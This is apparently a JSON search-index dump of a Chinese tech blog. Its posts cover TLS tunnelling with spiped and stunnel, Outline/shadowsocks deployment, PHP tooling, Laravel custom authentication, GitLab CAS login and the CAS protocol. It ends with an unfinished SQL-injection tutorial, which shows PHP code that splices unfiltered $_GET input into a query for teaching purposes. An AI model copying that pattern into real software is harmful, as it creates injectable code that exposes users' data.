golang-ldap库","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"ldap","slug":"ldap","permalink":"https://ushell.me/tags/ldap/"},{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"}]},{"title":"使用TLS加密通信数据","slug":"使用TLS加密通信数据","date":"2019-08-22T16:00:00.000Z","updated":"2019-08-22T16:00:00.000Z","comments":true,"path":"2019/08/23/使用TLS加密通信数据/","link":"","permalink":"https://ushell.me/2019/08/23/%E4%BD%BF%E7%94%A8TLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE/","excerpt":"","text":"随着某些业务安全性要求提高，敏感数据经过网络时需要加密传输。如MySQL, Redis这些协议在网络中传输是可以通过抓包分析到数据包内部信息的。 本文只是简单记录使用TLS加密某些软件数据流使用，本质上无论spiped还是stunnel都是通过建立隧道的方式进行安全传输。spiped是Redis官方推荐一个采用AES加密算法开源工具，该工具作者是OpenBSD的安全协会成员；stunnel则是一款采用非对称加密算法且闭源的工具，支持多个服务使用，相对spipped来说可以在多个场景使用。 Remote Redis: Spiped vs Stunnel这篇文章对比了两款工具的性能，感兴趣的可以自行验证。 #示例spipped 1234567891011# 生成密钥dd if=/dev/urandom bs=128 count=1 &gt; secret.key# 本地运行 (-e 加密 -s 源 -t 目标)spiped -e -s &#x27;127.0.0.1:6379&#x27; -t 服务器IP:8000 -k secret.key# 服务端运行 (-d 解密)spiped -d -s &#x27;0.0.0.0:8000&#x27; -t &#x27;127.0.0.1:6379&#x27; -k secret.key# 查看帮助 (连接树，超时设置)spiped -h stunnel 1234567891011121314# /etc/stunnel/redis-client.confcert = /etc/stunnel/private.pemclient = yespid = /var/run/stunnel.pid[redis]accept = 127.0.0.1:6379connect = 服务端IP:6380# /etc/stunnel/redis-server.confcert = /etc/stunnel/private.pempid = /var/run/stunnel.pid[redis]accept = 服务端IP:6380connect = 127.0.0.1:6379 #参考spiped加密通信stunnel文档spiped vs stunnel性能对比使用STUNNEL加密REDIS通信MySQL启用的SSL连接的思考与实践","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"tls","slug":"tls","permalink":"https://ushell.me/tags/tls/"},{"name":"spiped","slug":"spiped","permalink":"https://ushell.me/tags/spiped/"},{"name":"stunnel","slug":"stunnel","permalink":"https://ushell.me/tags/stunnel/"}]},{"title":"outline部署实践","slug":"outline部署实践","date":"2019-08-01T16:00:00.000Z","updated":"2019-08-01T16:00:00.000Z","comments":true,"path":"2019/08/02/outline部署实践/","link":"","permalink":"https://ushell.me/2019/08/02/outline%E9%83%A8%E7%BD%B2%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"outline是另一个爬墙的方案，主要采用docker的形式运行shadowsocks提供服务，是jigsaw团队折腾出来一个比较友好方案。outline由客户端，服务端管理和shadowbox(加强版的ss)组成，其中客户端支持win/linux/mac/android/iOS平台。截止目前客户端发版617次, 基本满足日常划水了。 outline优点 支持全平台 docker化部署 兼容shadowsocks客户端 支持API 支持监控 TypeScript实现 0x1 部署首先你要有一台服务器来部署服务，outline manager服务端软件提供四种方案；其中前三种是DigitalOcean、Google Cloud和AWS三家云厂商。貌似DigitalOcean可以低至5刀每月，最后一种是自建方案，推荐有vps的用户使用。 服务端配置: 下载安装脚本 1wget https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh 配置脚本 123456789#查看参数sh install_server.sh -h输出:Usage: install_server.sh [--hostname &lt;hostname&gt;] [--api-port &lt;port&gt;] [--keys-port &lt;port&gt;] --hostname 访问域名 --api-port API管理端口 --keys-port shadowsocks服务端口(兼容ss客户端) 执行安装 123456# 环境需要提前安装dockersh install_server.sh --hostname 域名 --api-port 80 --keys-port 443# docker镜像安装quay.io/outline/shadowbox =&gt; 封装的shadowsocks镜像docker.io/v2tec/watchtower=&gt; docker容器监控镜像 配置脚本安装完成后，终端中会输出如下信息。注意apiUlr的json数据, 服务端管理客户端需要这个。 12345678......To manage your Outline server, please copy the following line (including curlybrackets) into Step 2 of the Outline Manager interface:&#123;&quot;apiUrl&quot;:&quot;https://www.demo.com:33104/pHFagvPGtiprJ4gAVRcSVQ&quot;,&quot;certSha256&quot;:&quot;E71C445A78CF6D37D3959AE190D1E350425D5FB956232228FDEBEDD8CE689CC4&quot;&#125;...... 服务端客户端配置粘贴上述apiUlr json字符到客户端中即可添加 1* 分享链接中KEY需要解码，复制出`ss://`字符, 使用&quot;ss协议工具&quot;解密 outline server配置文件(docker容器) 12345678910应用目录: /root/shadowbox /root/shadowbox/bin/outline-ss-server /root/shadowbox/bin/prometheus配置目录: /opt/outline /opt/outline/persisted-state/shadowbox_config.json /opt/outline/persisted-state/shadowbox_server_config.json /opt/outline/persisted-state/outline-ss-server/config.yml 0x2 项目分析 outline这个项目前身是uProxy, outline项目主要分为outline-client、outline-server和outline-ss-server三个工程。outline-client采用electron和typescript开发客户端，移动端配置相对简单，github上有iOS客户端ipa文件。outline-ss-server工程使用golang重新实现shadowsocks功能，相对go-shadowsocks2多了端口复用和监控上报功能，更多详情参考官方说明。 outline核心是outline-server工程, 包装outline-ss-server作为一个核心代理服务。 项目模块: shadowbox 1shadowbox提供outline-ss-server服务docker镜像构建、配置加载和API服务实现 server_manager 1outline服务端管理软件，和outline-client类型都是采用electron实现GUI界面，调用API接口操作 sentry_webhook 1日志服务上报，利用Google cloud function功能配合https://sentry.io/outlinevpn平台上报数据 metrics_server 1元数据上报，利用Google cloud function功能实现数据上报。outline-server可以设置上报数据开关。具体参考shadowbox_server_config.json配置文件。如果Docker环境变量未设置SB_METRICS_URL值，系统默认上报地址是https://metrics-prod.uproxy.org, 无法通过outline-server修改上报地址。数据上报也是outline被诟病的地方。 outline的优势在于整体配置简单，有自成一体的客户端全家桶，使用方便。从本质上来说，都只是在shadowsocks上套了一层壳而已。 0x3 参考 官方仓库 官方文档 新闻报道 ss协议解析工具","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"outline","slug":"outline","permalink":"https://ushell.me/tags/outline/"},{"name":"酸酸乳","slug":"酸酸乳","permalink":"https://ushell.me/tags/%E9%85%B8%E9%85%B8%E4%B9%B3/"}]},{"title":"PHP本地开发环境浅析","slug":"PHP本地开发环境浅析","date":"2019-07-07T08:58:36.000Z","updated":"2019-07-07T08:58:36.000Z","comments":true,"path":"2019/07/07/PHP本地开发环境浅析/","link":"","permalink":"https://ushell.me/2019/07/07/PHP%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%B5%85%E6%9E%90/","excerpt":"","text":"PHP生态发展十几年了，目前依旧在业务开发语言中占一席之地。大部分公司业务开发都会要求统一开发风格，以便业务更好的迭代重构。PHP由于是解释性语言，前期开发环境配置简单；依赖的扩展及三方服务并不复杂，但随着业务的发展，引入的三方服务不断迭代更新就会造成开发人员的环境不统一，容易出现本地环境测试没有问题，一上线就出现各种奇怪的问题。 笔者总结下目前PHP本地开放环境趋势，大致有三类 #集成环境开发使用诸如phpstudy、xampp、mamp等集成环境，这些集成环境基本上满足PHP开发日常。这类集成环境在统一配置PHP扩展比较麻烦，尤其涉及windows环境扩展更加繁琐。 #phpbrew自由式phpbrew是一个PHP多版本包管理软件，支持多版本，自由配置扩展等便捷操作。笔者比较推荐使用这种方式开发PHP项目，phpbrew在mac/linux环境使用基本满足需求，windows开发环境配置phpbrew比较麻烦一些。微软这几年推进windows shell环境的使用，相信过几年三端开发环境差异性会逐渐缩小。 示例: 1234567891011#安装特定版本phpbrew install 7.3.0#设置PHP版本phpbrew use 7.3.0#扩展安装phpbrew ext install ldap#关闭phpbrewphpbrew off #Laravel homesteadlaravel homestead是laravel官方出品的开发环境方案，通过vagrant加载配置文件初始化PHP项目所需要的环境。vagrant使用virtualbox等虚拟机方式加载laravel/homestead box镜像的方式统一项目中研发人员的开发环境，该方案属于笨重的方式。box镜像文件比较大、需要配置homestead.yaml和需要安装virtualbox没有那么灵活。企业级开发可以使用该方案，不过homestead支持其他框架么，如Yii2/Symfony/CI？ #Docker化一切服务皆可docker？随着微服务化、k8s和云上服务等技术兴起，docker这个容器也随之成了研发人员常常讨论的话题。docker优点主要在于容器化、隔离型、易于管理和轻便性为主。PHP在docker的生态环静发展也不错，主流镜像基本都有。PHP这里采用docker主要存在两个方面：一是docker构建业务代码；二是docker构建本地开发的环境。前者通过gitlab中的ci脚本统一构建代码运行环境，便于运维管理发布回滚等操作。后者主要是便于开发人员本地搭建环境节省大量时间。很多时候只是验证某些服务的场景，手动搭建环境会遇到很多问题；手动搭建唯一好处就是可以非常了解系统的运行及系统的官方手册 :) laradock是PHP集成环境docker化一个方案，通过内置开发环境所需的dockerfile文件进行自动构建；该项目目前github拥有星星7k+的状态，仓库内置许多服务的dockerfile可以用来学习某些服务dockerfile写法，推荐学习下 #结论?由于每个人的喜好不同，开发习惯也不同。如果想自由些，推荐phpbrew+docker开发PHP项目；企业级想强制规范开发环境可以使用homestead方案。对于windows环境下的开发者，笔者建议下载virtualbox安装debian环境进行日常开发，毕竟windows下开发会存在很多诡异问题。 或许几年后又流行XX方案呢？一切都只是趋势下的产物 #参考vagrantup文档Homestead文档phpbrew仓库laradock文档","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"phpbrew","slug":"phpbrew","permalink":"https://ushell.me/tags/phpbrew/"},{"name":"laradock","slug":"laradock","permalink":"https://ushell.me/tags/laradock/"}]},{"title":"composer加速","slug":"composer加速","date":"2019-07-07T08:00:51.000Z","updated":"2019-07-07T08:00:51.000Z","comments":true,"path":"2019/07/07/composer加速/","link":"","permalink":"https://ushell.me/2019/07/07/composer%E5%8A%A0%E9%80%9F/","excerpt":"","text":"composer官方在2020-10-24发布composer2，包处理能力整体提升不少；同时prestissimo项目推荐使用composer2, 并且支持范围限定在2.0以下版本。官方博客中提到composer2.x虽然支持PHP5.6等低版本，后续composer2.x版本会要求PHP在7.0以上主流版本；推荐升级PHP版本，毕竟PHP8都出来了。 composer2升级: 1composer self-update --2 composer2新增runtime特性，其中plaform check功能会检查当前PHP版本，如果PHP版本符合包的要求会报错，具体特性参考官方博客 注意：阿里云和腾讯云composer镜像存在一定几率异常，优先使用官方镜像 composer是PHP项目包管理利器，由于墙的原因导致包下载速度缓慢；composer全量镜像主要有phpcomposer、laravel-china和新开放的阿里云。阿里云最近开放composer镜像仓库，大大减少包下载的速度。笔者推荐阿里云+prestissimo组合方式。 腾讯云也跟随阿里的脚步开放composer全量镜像仓库, 官网配置, 阿里的composer偶尔也会抽筋，可能与本地网络有关 :) laravel-china全量镜像仓库将会在两个月左右关闭，具体移步阅读。 #阿里云composer配置1234全局安装(推荐): composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/取消配置: composer config -g --unset repos.packagist 这里使用composer下载包时使用-vvv参数显示进度详情，能有有一个直观的体现。 #prestissimo并发加速prestissimo是一个并发下载的composer插件，通过使用curl_multi*系列方法并发请求包，一定程度节约时间。 12安装: composer global require hirak/prestissimo卸载: composer global remove hirak/prestissimo #参考: prestissimo仓库 阿里云Composer全量镜像 腾讯云Composer全量镜像 composer2","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"composer","slug":"composer","permalink":"https://ushell.me/tags/composer/"},{"name":"prestissimo","slug":"prestissimo","permalink":"https://ushell.me/tags/prestissimo/"},{"name":"composer2","slug":"composer2","permalink":"https://ushell.me/tags/composer2/"}]},{"title":"laravel自定义认证","slug":"laravel自定义认证","date":"2019-06-01T16:00:00.000Z","updated":"2019-06-01T16:00:00.000Z","comments":true,"path":"2019/06/02/laravel自定义认证/","link":"","permalink":"https://ushell.me/2019/06/02/laravel%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AE%A4%E8%AF%81/","excerpt":"","text":"laravel自带用户认证基本满足简单业务需求，如果要开发API接口则需要引入jwt认证组件。jwt组件的配置参考JWT 完整使用详解, 本文主要记录下围绕API与JWT认证一些使用技巧。 0x1 自定义认证如果用户认证使用一些三方的认证服务，应该如何处理呢？Laravel提供自定义的认证的入口，通过Provider形式替代原有的认证逻辑。 注册自定义认证方法: 123456789101112131415161718192021#app/Providers/AuthServiceProvider.phpclass AuthServiceProvider extends ServiceProvider&#123; //省略... /** * Register any authentication / authorization services. * * @return void */ public function boot() &#123; $this-&gt;registerPolicies(); //注册DIYUserServiceProvider Auth::provider(&quot;DIY&quot;, function($app, array $config)&#123; return new DIYUserServiceProvider($app); &#125;); &#125;&#125; 修复配置: 123456#config/auth.php &#x27;providers&#x27; =&gt; [ &#x27;users&#x27; =&gt; [ &#x27;driver&#x27; =&gt; &#x27;DIY&#x27;, ], ], 生成provider文件 1php artisan make:provider DIYUserServiceProvider 实现DIYUserServiceProvider方法: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#app/Providers/DIYUserServiceProvider.php&lt;?phpnamespace App\\Providers;use Illuminate\\Contracts\\Auth\\UserProvider;use Illuminate\\Support\\ServiceProvider;use Illuminate\\Contracts\\Auth\\Authenticatable as UserContract;use App\\User;use App\\Services\\DIYUserService;class DIYUserServiceProvider extends ServiceProvider implements UserProvider&#123; /** * Retrieve a user by their unique identifier. * * @param mixed $identifier * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveById($identifier) &#123; // 根据认证信息获取用户信息 $user = []; //App\\User对象增加Model属性attributes return new User([&#x27;attributes&#x27; =&gt; $user]); &#125; /** * Retrieve a user by their unique identifier and &quot;remember me&quot; token. * * @param mixed $identifier * @param string $token * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveByToken($identifier, $token) &#123; return new User($identifier); &#125; /** * Update the &quot;remember me&quot; token for the given user in storage. * * @param \\Illuminate\\Contracts\\Auth\\Authenticatable $user * @param string $token * @return void */ public function updateRememberToken(UserContract $user, $credentials) &#123; &#125; /** * Retrieve a user by the given credentials. * * @param array $credentials * @return \\Illuminate\\Contracts\\Auth\\Authenticatable|null */ public function retrieveByCredentials(array $credentials) &#123; $user = new User($credentials); return $user; &#125; /** * Validate a user against the given credentials. * * @param \\Illuminate\\Contracts\\Auth\\Authenticatable $user * @param array $credentials * @return bool */ public function validateCredentials(UserContract $user, array $credentials) &#123; $username = $credentials[&#x27;email&#x27;]; $password = $credentials[&#x27;password&#x27;]; // 实现用户认证 return DIYUserService::auth($username, $password); &#125;&#125; User模型认证方法调用过程中都会使用到App\\User这个类文件，jwt在这个类中增加getJWTIdentifier和getJWTCustomClaims方法。DIYUserServiceProvider方法需要将部分认证信息赋予到User类。在后续使用Laravel-permission组件时也需要增加特定方法。 0x2 API鉴权业务模块不同，用户角色不同可以通过laravel-permission权限组件完成对用户接口调用权限的识别。laravel-permission组件是entrust组件的替代品，也是通过role、permission和model对用户权限控制。 laravel-permission组件: 基础使用12345678#创建角色、权限$role = Role::create([&#x27;name&#x27; =&gt; &#x27;admin&#x27;]);$permissions = [ Permission::create([&#x27;name&#x27; =&gt; &#x27;user-manage&#x27;]), Permission::create([&#x27;name&#x27; =&gt; &#x27;role-manage&#x27;]),];$role-&gt;syncPermissions($permissions); API限制123456789101112131415161718192021#路由配置Route::group([&#x27;middleware&#x27; =&gt; &#x27;role:admin&#x27;], function () &#123; //...&#125;);#User类实现判断方法(App\\User.php)#该方法需要单独添加, v5.8版本中没有hasAnyRole该方法public function hasAnyRole($roles)&#123; $user = $this-&gt;getAttribute(&#x27;attributes&#x27;); foreach ($roles as $role) &#123; if ($role !== $user[&#x27;roles&#x27;]) &#123; return false; &#125; &#125; return true;&#125; 0x3 总结laravel的生态系统丰富，各种各样组件都存在；使用不同的组件排列组合实现不同的功能，虽然laravel号称最优雅的框架，但是内部逻辑复杂难懂。 本文由于笔者能力有限，不足之处欢迎留言探讨。 0x4 参考laravel用户认证文档laravel-permission文档","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"laravel","slug":"laravel","permalink":"https://ushell.me/tags/laravel/"},{"name":"jwt","slug":"jwt","permalink":"https://ushell.me/tags/jwt/"},{"name":"laravel-permission","slug":"laravel-permission","permalink":"https://ushell.me/tags/laravel-permission/"}]},{"title":"microtime毫秒时间戳陷阱","slug":"microtime毫秒时间戳陷阱","date":"2019-05-30T06:48:48.000Z","updated":"2019-05-30T06:48:48.000Z","comments":true,"path":"2019/05/30/microtime毫秒时间戳陷阱/","link":"","permalink":"https://ushell.me/2019/05/30/microtime%E6%AF%AB%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%E9%99%B7%E9%98%B1/","excerpt":"","text":"毫秒时间戳是API开发过程中使用的一种时间格式，PHP语言通过microtime函数获取机器的时间戳；microtime函数底层依赖C语言的gettimeofday函数获取数据。毫秒时间戳是一个13位长度的整型数据。由于PHP语言特性，mictotime毫秒部分长度不固定，省略了0的部分，错误的使用会导致获取的毫秒时间戳长度异常。 #时间转换科普 毫秒 (ms) 121秒 = 1000毫秒1毫秒 = 0.001秒 微秒 (us) 121秒 = 1000000微秒1毫秒 = 1000微秒 #毫秒时间戳 示例代码 123456789$time = explode(&quot;.&quot;, microtime(true));//处理毫秒部分$time[0] = $time[0] * 1000;$microtime = $time[0] + substr($time[1], 0, 3);echo intval($microtime); //输出: 1559197645889 由于microtime函数返回的毫秒部分是4位，gettimeofday函数返回的毫秒部分是6位；所以系统对时间精确度要求高的地方应该注意。 #microtime函数实现12345678910111213141516171819202122232425262728293031323334#ext/standard/microtime.c//原型PHP_FUNCTION(microtime)&#123; _php_gettimeofday(INTERNAL_FUNCTION_PARAM_PASSTHRU, 0);&#125;//实现static void _php_gettimeofday(INTERNAL_FUNCTION_PARAMETERS, int mode)&#123; zend_bool get_as_float = 0; struct timeval tp = &#123;0&#125;; ZEND_PARSE_PARAMETERS_START(0, 1) Z_PARAM_OPTIONAL Z_PARAM_BOOL(get_as_float) ZEND_PARSE_PARAMETERS_END(); if (gettimeofday(&amp;tp, NULL)) &#123; RETURN_FALSE; &#125; //microtime参数为true if (get_as_float) &#123; RETURN_DOUBLE((double)(tp.tv_sec + tp.tv_usec / MICRO_IN_SEC)); &#125; if (mode) &#123; //省略... &#125; else &#123; RETURN_NEW_STR(zend_strpprintf(0, &quot;%.8F %ld&quot;, tp.tv_usec / MICRO_IN_SEC, (long)tp.tv_sec)); &#125;&#125; gettimeofday函数对比实现 1234567891011121314151617181920212223242526272829303132# demo.c#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/time.h&gt;#include&lt;unistd.h&gt;void microtime()&#123; struct timeval tv; struct timezone tz; gettimeofday(&amp;tv, NULL); double php_time; //PHP时间格式 php_time = (double)(tv.tv_sec + tv.tv_usec / 1000000.00); printf(&quot;tv_sec: %ld, tv_usec: %d, php_time: %f\\n&quot;, tv.tv_sec, tv.tv_usec, php_time);&#125;int main()&#123; for (int i = 0; i &lt; 10000; i++) &#123; microtime(); usleep(300); &#125; return 0;&#125; 通过了解microtime函数的实现，其实可以发现PHP变量类型double会自动省略小数后面的0 示例代码 1234$a = (double) 1.2000;var_dump($a); //输出: float(1.2) #宏RETURN_DOUBLE这里主要了解下PHP源码中函数返回值大都采用宏函数的形式返回，如RETURN_DOUBLE等，具体实现在zend_API.h和zend_types.h文件中。 简析 1待定...","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"microtime","slug":"microtime","permalink":"https://ushell.me/tags/microtime/"}]},{"title":"Gitlab配置CAS认证","slug":"Gitlab配置CAS认证","date":"2019-05-25T16:00:36.000Z","updated":"2019-05-25T16:00:36.000Z","comments":true,"path":"2019/05/26/Gitlab配置CAS认证/","link":"","permalink":"https://ushell.me/2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/","excerpt":"","text":"Gitlab采用Omniauth框架支持多种认证方式, 在开发SSO系统过程中笔者采用CAS认证的方式打通Gitlab系统与SSO. 采用CAS协议认证需要了解CAS协议交互过程及接口对应的数据结构，可参考上一篇文章CAS协议 #Gitlab配置 编辑Gitlab配置文件(/etc/gitlab/gitlab.rb) 123456789101112131415161718192021### OmniAuth Settingsgitlab_rails[&#x27;omniauth_enabled&#x27;] = truegitlab_rails[&#x27;omniauth_allow_single_sign_on&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_sync_email_from_provider&#x27;] = &#x27;cas3&#x27;gitlab_rails[&#x27;omniauth_sync_profile_from_provider&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_sync_profile_attributes&#x27;] = [&#x27;email&#x27;]gitlab_rails[&#x27;omniauth_auto_sign_in_with_provider&#x27;] = &#x27;cas3&#x27;gitlab_rails[&#x27;omniauth_block_auto_created_users&#x27;] = falsegitlab_rails[&#x27;omniauth_external_providers&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_providers&#x27;] = [ &#123; &quot;name&quot; =&gt; &quot;cas3&quot;, #使用CAS3协议 &quot;label&quot;=&gt; &quot;SSO&quot;, #Gitlab登陆页面显示认证名称 &quot;args&quot; =&gt; &#123; &quot;url&quot; =&gt; &quot;http://192.168.0.2:8080&quot;, #SSO地址 &quot;login_url&quot; =&gt; &quot;/login&quot;, #SSO登陆地址 &quot;service_validate_url&quot; =&gt; &quot;/verify&quot;, #SSO授权接口 &quot;logout_url&quot; =&gt; &quot;/logout&quot; #SSO退出接口 &#125; &#125;] 重加载配置文件 1#gitlab-ctl reconfigure 重启服务 1#gitlab-ctl restart #Gitlab Docker配置这里推荐使用docker搭建gitlab服务便于测试 12345678910111213141516171819202122232425262728#gitlab.ymlversion: &#x27;2&#x27;services: gitlab: image: &#x27;gitlab/gitlab-ce&#x27; restart: always container_name: gitlab environment: TZ: &#x27;Asia/Shanghai&#x27; GITLAB_OMNIBUS_CONFIG: | #external_url &#x27;http://gitlab.example.com&#x27; gitlab_rails[&#x27;omniauth_enabled&#x27;] = true gitlab_rails[&#x27;omniauth_allow_single_sign_on&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_sync_email_from_provider&#x27;] = &#x27;cas3&#x27; gitlab_rails[&#x27;omniauth_sync_profile_from_provider&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_sync_profile_attributes&#x27;] = [&#x27;email&#x27;] gitlab_rails[&#x27;omniauth_auto_sign_in_with_provider&#x27;] = &#x27;cas3&#x27; gitlab_rails[&#x27;omniauth_block_auto_created_users&#x27;] = false gitlab_rails[&#x27;omniauth_external_providers&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_providers&#x27;] = [&#123;&quot;name&quot; =&gt; &quot;cas3&quot;,&quot;label&quot;=&gt; &quot;SSO&quot;,&quot;args&quot; =&gt; &#123;&quot;url&quot; =&gt; &quot;http://192.168.0.2:8080&quot;,&quot;login_url&quot; =&gt; &quot;/login&quot;,&quot;service_validate_url&quot; =&gt; &quot;/verify&quot;,&quot;logout_url&quot; =&gt; &quot;/logout&quot;&#125;&#125;] ports: - &quot;80:80&quot; - &quot;443:443&quot; - &quot;10022:22&quot; volumes: - &#x27;/srv/gitlab/config:/etc/gitlab&#x27; - &#x27;/srv/gitlab/logs:/var/log/gitlab&#x27; - &#x27;/srv/gitlab/data:/var/opt/gitlab&#x27; #参考 [gitlab docker环境变量] https://docs.gitlab.com/omnibus/settings/environment-variables.html [gitlab支持CAS认证] https://gitlab.com/help/integration/cas.md [gitlab认证组件omniauth] https://docs.gitlab.com/ce/integration/omniauth.html","categories":[{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/categories/gitlab/"}],"tags":[{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/tags/gitlab/"}]},{"title":"CAS协议","slug":"CAS协议","date":"2019-05-25T11:41:19.000Z","updated":"2019-05-25T11:41:19.000Z","comments":true,"path":"2019/05/25/CAS协议/","link":"","permalink":"https://ushell.me/2019/05/25/CAS%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"CAS全称是中心认证服务(Central Authentication Service), 是SSO服务中一种认证协议, 目前有三个版本1.0, 2.0, 3.0 #CAS认证流程 认证过程1略... :) 如图所示 #CAS协议认证接口URI 接口列表 1234567891011121314151. /login接口2. /logout接口3. /validate接口 Ticket认证接口 (v1.0)4. /serviceValidate接口 Ticket认证接口 (v2.0)5. /proxyValidate接口 Ticket认证/代理接口 (v2.0)6. /proxy接口 代理服务接口 (v2.0)7. /p3/serviceValidate接口 Ticket认证接口（v3.0）8. /p3/proxyValidate接口 Ticket认证/代理接口 (v3.0) 接口数据结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#login接口请求参数: service=http://686617c54d47/users/auth/cas3/callback?url=http://127.0.0.1/users/sign_in 选填参数: renew= gateway= method=响应参数: 认证成功: 302跳转到service地址, 附带ticket认证成功参数 认证失败: SSO登陆页面提示错误信息#logout接口v1.0,v2.0版本: 账户退出成功后显示成功信息的页面v3.0版本: 请求参数中不带service, 显示退出成功页面；参数中带有service，退出成功后跳转到service页面#validate接口 (不推荐使用)请求参数: service: ticket: (login时认证的Ticket) renew(选填)响应参数: 认证成功: yes&lt;LF&gt; 认证失败: no&lt;LF&gt;#serviceValidate接口请求参数: service: ticket: (login时认证的Ticket) pgtUrl: (代理url, 选填) renew: (选填) format: (期待响应结果格式:xml或json, Gitlab默认使用XML)响应参数: 认证成功(xml格式): &lt;cas:serviceResponse xmlns:cas=&quot;http://www.yale.edu/tp/cas&quot;&gt; &lt;cas:authenticationSuccess&gt; &lt;cas:user&gt;业务参数&lt;/cas:user&gt; &lt;cas:attributes&gt; &lt;cas:firstname&gt;业务参数&lt;/cas:firstname&gt; &lt;/cas:attributes&gt; &lt;cas:proxyGrantingTicket&gt;新生成的Ticket&lt;/cas:proxyGrantingTicket&gt; &lt;/cas:authenticationSuccess&gt; &lt;/cas:serviceResponse&gt; 认证失败(xml格式): &lt;cas:serviceResponse xmlns:cas=&quot;http://www.yale.edu/tp/cas&quot;&gt; &lt;cas:authenticationFailure code=&quot;INVALID_TICKET&quot;&gt; 错误信息 &lt;/cas:authenticationFailure&gt; &lt;/cas:serviceResponse&gt;认证失败相关的错误码: INVALID_REQUEST | INVALID_TICKET_SPEC | INVALID_TICKET | INVALID_SERVICE | INTERNAL_ERROR #Ticket身份票据ticket是认证周期中身份凭证，ticket字符仅包含{A-Z, a-z, 0-9}和”-“, 字符长度最好大于64位 123456789101112131415161718192021222324252627282930service类型Ticket: 1. 用于校验login service参数中的地址 2. Ticket字符串必须以&quot;ST-&quot;开头 3. Ticket验证次数限制，有效期等安全性 proxy类型Ticket: 1. 用于校验proxy service参数中的地址 2. Ticket字符串必须以&quot;PT-&quot;开头 3. Ticket验证次数限制，有效期等安全性 proxy-grant类型Ticket: 1. 多级别proxy代理中使用，非一次性ticket 2. Ticket字符串必须以&quot;PGT-&quot;开头 3. Ticket验证次数限制，有效期等安全性 login类型Ticket: 1. 登陆成功后标志Ticket 2. Ticket字符串必须以&quot;LT-&quot;开头 ticket-granting类型: 1. Verify认证成功后产生的Ticket 2. Ticket字符串必须以&quot;TGT-&quot;开头 3. Ticket验证次数限制，有效期等安全性 4. 尽量再加密一次Ticket ticket-granting cookie类型: 1. Verify认证成功后产生的Ticket, 保存在Cookie中(同二级域名下使用cookie) 2. Ticket字符串必须以&quot;TGC-&quot;开头 3. Cookie路径严格限制 （多用于同二级域名其他站点） 4. Cookie中可能包含ticket-granting的ticket(不推荐) #参考 [CAS协议细节] https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html [CAS协议原理] https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html [CAS客户端实现] https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html [CAS原理解析] https://juejin.im/post/5a002b536fb9a045132a1727","categories":[{"name":"protocol","slug":"protocol","permalink":"https://ushell.me/categories/protocol/"}],"tags":[{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"}]},{"title":"How SQLi ATTACK","slug":"How-SQLi-ATTACK","date":"2018-01-21T08:31:18.000Z","updated":"2018-01-21T08:31:18.000Z","comments":true,"path":"2018/01/21/How-SQLi-ATTACK/","link":"","permalink":"https://ushell.me/2018/01/21/How-SQLi-ATTACK/","excerpt":"","text":"SQL语言是实现数据库操作的一种编程语言，数据库解析器通过解析SQL实现对数据的增删改查等操作。目前主流数据库有MySQL、Oracle、MSSQL、Postgresql、MongoDB等等。Web架构采用脚本语言+数据库的形式构建服务，SQLi就出现在脚本语言逻辑处理中。而SQLi(SQL Injection)攻击已经延续了十多年之久，历年占据OWASP Top10榜首。SQLi在传统框架中出现的频率极为高，而现代形式Web框架从底层屏蔽了SQLi出现的可能性。 #SQL基础SQL语言分为DDL、DML、DCL、TCL等，其中DML语言是目前使用最高的。DDL语言（Data Definition Language） create alter drop truncate comment rename DML语言(Data Manipulation Language) select insert update delete merge call explain plan lock table DCL语言(Data control language) grant revoke TCL语言(Transcation control language) commit savepoint rollback set transcation 由于权限的原因，SQLi常使用的DDL+DML对系统后端数据库操作。一个基础SQLi的产生是后端系统未对用户输入的数据进行过滤，使用户输入数据与业务SQL语句拼接，导致产生非法操作。 123456789&lt;?php //业务逻辑 $name = $_GET[&#x27;name&#x27;]; $id = $_GET[&#x27;id&#x27;]; //字符型注入 $sql = &quot;select * from user where 